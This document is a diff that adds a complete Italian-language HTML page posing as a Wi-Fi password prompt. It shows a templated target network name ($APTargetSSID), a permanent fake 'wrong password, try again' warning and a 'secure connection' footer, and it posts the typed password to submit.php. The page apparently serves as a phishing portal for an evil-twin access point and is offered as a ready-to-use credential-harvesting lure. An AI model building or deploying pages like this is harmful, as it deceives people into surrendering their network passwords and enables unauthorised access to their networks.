@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#eef4fb">
+<meta name="robots" content="noindex">
+<title>Rete Wi-Fi</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; }
+  :root {
+    --ink: #13233b;
+    --muted: #6c7d92;
+    --line: #dbe5f0;
+    --blue: #1268d6;
+    --blue-dark: #0c54b3;
+    --blue-soft: #eaf2fd;
+    --red: #c93434;
+  }
+  html { background: #eef4fb; }
+  body {
+    margin: 0;
+    min-height: 100vh;
+    background:
+      radial-gradient(circle at 15% 8%, rgba(255,255,255,.96) 0 20%, transparent 56%),
+      linear-gradient(155deg, #eef4fb 0%, #f8fbff 48%, #e8f0f9 100%);
+    color: var(--ink);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    -webkit-text-size-adjust: 100%;
+  }
+  .shell {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 20px calc(26px + env(safe-area-inset-bottom));
+  }
+  .card {
+    width: 100%;
+    max-width: 410px;
+    background: #fff;
+    border: 1px solid rgba(255,255,255,.9);
+    border-radius: 22px;
+    box-shadow: 0 22px 60px rgba(28,58,96,.16), 0 2px 8px rgba(28,58,96,.06);
+    padding: 30px 28px 28px;
+  }
+  .brand { display: flex; align-items: center; gap: 11px; margin-bottom: 26px; }
+  .brand-icon {
+    width: 42px;
+    height: 42px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: none;
+    border-radius: 13px;
+    background: linear-gradient(145deg, #2e8bfa, #0c54b3);
+    box-shadow: 0 7px 16px rgba(18,104,214,.25);
+  }
+  .brand-icon svg { width: 24px; height: 24px; display: block; }
+  .brand-name { font-size: 16px; font-weight: 700; letter-spacing: .1px; }
+  .brand-sub { margin-top: 2px; font-size: 12px; color: var(--muted); }
+  h1 { margin: 0 0 9px; font-size: 25px; line-height: 31px; font-weight: 700; letter-spacing: -.5px; }
+  .lead { margin: 0 0 22px; color: var(--muted); font-size: 14px; line-height: 21px; }
+  .network {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 22px;
+    padding: 13px 14px;
+    background: var(--blue-soft);
+    border: 1px solid #d8e8fc;
+    border-radius: 14px;
+  }
+  .network-icon {
+    width: 36px;
+    height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex: none;
+    border-radius: 11px;
+    background: #fff;
+    color: var(--blue);
+    box-shadow: 0 2px 6px rgba(18,104,214,.1);
+  }
+  .network-icon svg { width: 20px; height: 20px; display: block; }
+  .network-copy { min-width: 0; flex: 1; }
+  .network-label { color: var(--muted); font-size: 11px; font-weight: 600; letter-spacing: .5px; text-transform: uppercase; }
+  .network-name {
+    margin-top: 2px;
+    font-size: 15px;
+    font-weight: 650;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .lock { color: var(--blue); display: flex; flex: none; }
+  .lock svg { width: 18px; height: 18px; display: block; }
+  form { margin: 0; }
+  .field-label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 650; }
+  .field { position: relative; }
+  .field input {
+    width: 100%;
+    height: 52px;
+    padding: 0 54px 0 14px;
+    background: #fff;
+    border: 1px solid var(--line);
+    border-radius: 13px;
+    color: var(--ink);
+    font-family: inherit;
+    font-size: 16px;
+    outline: none;
+    -webkit-appearance: none;
+    appearance: none;
+    transition: border-color .15s ease, box-shadow .15s ease;
+  }
+  .field input::placeholder { color: #99a7b8; font-size: 15px; }
+  .field input:focus { border-color: #89b6f0; box-shadow: 0 0 0 4px rgba(18,104,214,.1); }
+  .toggle {
+    position: absolute;
+    top: 50%;
+    right: 7px;
+    width: 38px;
+    height: 38px;
+    transform: translateY(-50%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 0;
+    border-radius: 10px;
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+  }
+  .toggle:hover { background: #f3f7fc; color: var(--ink); }
+  .toggle svg { width: 19px; height: 19px; display: block; }
+  .toggle .eye-off { display: none; }
+  .toggle.is-visible .eye { display: none; }
+  .toggle.is-visible .eye-off { display: block; }
+  .hint { margin: 8px 1px 0; color: var(--muted); font-size: 12px; line-height: 17px; }
+  .submit {
+    width: 100%;
+    height: 50px;
+    margin-top: 18px;
+    border: 0;
+    border-radius: 13px;
+    background: #a9c6ea;
+    color: #fff;
+    font: 700 16px/50px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    cursor: pointer;
+    transition: background-color .15s ease, box-shadow .15s ease;
+  }
+  .submit.ready { background: var(--blue); box-shadow: 0 8px 18px rgba(18,104,214,.22); }
+  .submit.ready:hover { background: var(--blue-dark); }
+  .alert {
+    display: flex;
+    gap: 9px;
+    margin: 0 0 18px;
+    padding: 11px 12px;
+    border: 1px solid #f2cccc;
+    border-radius: 12px;
+    background: #fff5f5;
+    color: var(--red);
+    font-size: 13px;
+    line-height: 18px;
+  }
+  .alert svg { width: 17px; height: 17px; flex: none; margin-top: 1px; }
+  .foot {
+    margin-top: 22px;
+    color: #8797aa;
+    font-size: 12px;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <main class="shell">
+    <section class="card">
+      <div class="brand">
+        <div class="brand-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+            <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+            <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+            <circle cx="12" cy="19.2" r="1.35" fill="#fff"/>
+          </svg>
+        </div>
+        <div>
+          <div class="brand-name">Wi-Fi</div>
+          <div class="brand-sub">Rete protetta</div>
+        </div>
+      </div>
+
+      <h1>Inserisci la password Wi-Fi</h1>
+
+      <div class="alert" role="alert">
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <circle cx="12" cy="12" r="9.2" stroke="currentColor" stroke-width="1.8"/>
+          <path d="M12 7.4v5.5" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+          <circle cx="12" cy="16.6" r="1.15" fill="currentColor"/>
+        </svg>
+        <span>Password errata. Riprova.</span>
+      </div>
+
+      <div class="network">
+        <div class="network-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+            <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+            <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+            <circle cx="12" cy="19.2" r="1.3" fill="currentColor"/>
+          </svg>
+        </div>
+        <div class="network-copy">
+          <div class="network-label">Rete</div>
+          <div class="network-name">$APTargetSSID</div>
+        </div>
+        <div class="lock" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <rect x="4.4" y="10.2" width="15.2" height="10.4" rx="2.5" stroke="currentColor" stroke-width="1.9"/>
+            <path d="M8.1 10.2V7.7a3.9 3.9 0 0 1 7.8 0v2.5" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+          </svg>
+        </div>
+      </div>
+
+      <form action="submit.php" method="post" id="wifiForm" autocomplete="off">
+        <label class="field-label" for="password">Password Wi-Fi</label>
+        <div class="field">
+          <input id="password" name="password" type="password"
+                 placeholder="Password Wi-Fi"
+                 autocapitalize="none" autocorrect="off" spellcheck="false"
+                 autocomplete="off" required>
+          <button type="button" class="toggle" id="togglePassword"
+                  aria-label="Mostra password" aria-pressed="false">
+            <svg class="eye" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M2.7 12s3.4-6 9.3-6 9.3 6 9.3 6-3.4 6-9.3 6S2.7 12 2.7 12Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+              <circle cx="12" cy="12" r="2.7" stroke="currentColor" stroke-width="1.8"/>
+            </svg>
+            <svg class="eye-off" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M4.2 4.2l15.6 15.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              <path d="M9.9 6.4A10.7 10.7 0 0 1 12 6.1c5.9 0 9.3 5.9 9.3 5.9a17 17 0 0 1-3 3.5M14.4 17.7c-.8.2-1.6.3-2.4.3-5.9 0-9.3-6-9.3-6a17.3 17.3 0 0 1 3.4-3.8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+        <p class="hint">La password distingue tra maiuscole e minuscole.</p>
+        <button type="submit" id="submitBtn" class="submit">Connetti</button>
+      </form>
+    </section>
+    <footer class="foot">Connessione sicura</footer>
+  </main>
+
+  <script>
+    (function () {
+      var form = document.getElementById('wifiForm');
+      var input = document.getElementById('password');
+      var button = document.getElementById('submitBtn');
+      var toggle = document.getElementById('togglePassword');
+
+      function sync() {
+        button.classList.toggle('ready', input.value.length > 0);
+      }
+      input.addEventListener('input', sync);
+      sync();
+
+      toggle.addEventListener('click', function () {
+        var visible = input.type === 'text';
+        input.type = visible ? 'password' : 'text';
+        toggle.classList.toggle('is-visible', !visible);
+        toggle.setAttribute('aria-pressed', String(!visible));
+        toggle.setAttribute('aria-label', !visible ? 'Nascondi password' : 'Mostra password');
+        input.focus();
+      });
+    }());
+  </script>
+</body>
+</html>
